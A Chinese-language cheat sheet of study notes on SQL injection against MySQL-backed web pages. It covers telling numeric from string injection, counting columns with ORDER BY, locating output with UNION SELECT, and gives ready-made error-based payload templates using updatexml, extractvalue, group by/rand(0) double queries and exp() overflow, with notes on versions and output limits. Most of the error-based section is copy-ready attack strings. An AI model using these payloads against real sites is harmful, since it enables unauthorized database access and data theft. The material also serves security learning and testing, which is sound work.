# sql注入知识

　　**判断 Sql 注入漏洞的类型**：1.数字型 2.字符型

　　一、用 and 1=1 和 and 1=2 来判断：

　　1.Url 地址中输入 http://xxx/abc.php/?id= x and 1=1 页面依旧运行正常，继续进行下

　　2.Url 地址中继续输入 http://xxx/abc.php/?id= x and 1=2 ，页面运行错误，则说明此 Sql 注入为数字型注入

　　3.页面显示正常，**说明不是数字型注入漏洞 而是字符型注入漏洞**

　　二、

　　1.输入单引号或者双引号可以看到报错，且报错信息看不到数字，我们可以猜测sql语句应该是数字型注入，反之则是字符型注入

　　2.添加注释 例：?id=1'--+ **继续报错则是数字型 反之 正常则是字符型**

　　**判断注入点**

　　**判断列数**

　　使用**order by**，从1开始逐渐递增，报错时停止

　　**判断数据显示位置（显错位）**

　　使用联合查询 **union select 1，2，……（根据列数来）**

　　‍
# **报错注入**：
1. updatexml () 注入（实战首选）
- 原理：XML 解析错误，XPath 表达式内容随错误返回
- 适用版本：MySQL 5.1.5+
- 标准模板：
```sql
?id=1' and updatexml(1,concat(0x7e,(查询语句),0x7e),1)--+
```
结果格式：XPATH syntax error: '~数据~'
优缺点：语法最简单、100% 稳定；最多返回 32 字符

2. extractvalue () 注入
原理：同 updatexml ()，XML 节点提取错误
适用版本：MySQL 5.1.5+
标准模板：
sql
?id=1' and extractvalue(1,concat(0x7e,(查询语句),0x7e))--+
结果格式：同 updatexml ()
优缺点：语法更简洁；同样 32 字符限制

3. 双查询注入（group by+rand ()）
原理：分组主键冲突，随机数两次计算结果不同
适用版本：所有 MySQL 版本
标准模板（必用 rand (0) 保证稳定）：
```sql
?id=-1' union select 1,count(*),concat((查询语句),floor(rand(0)*2)) as x from information_schema.tables group by x--+
```
结果格式：Duplicate entry '数据0' for key 'group_key'
优缺点：无长度限制、兼容老版本；语法复杂

4. exp () 注入
原理：指数函数数值溢出错误
适用版本：MySQL 5.5.5+
标准模板：
```sql
?id=1' and exp(~(select * from (查询语句)a))--+
```
结果格式：DOUBLE value is out of range in 'exp(数据)'
优缺点：无长度限制；适用版本稍高
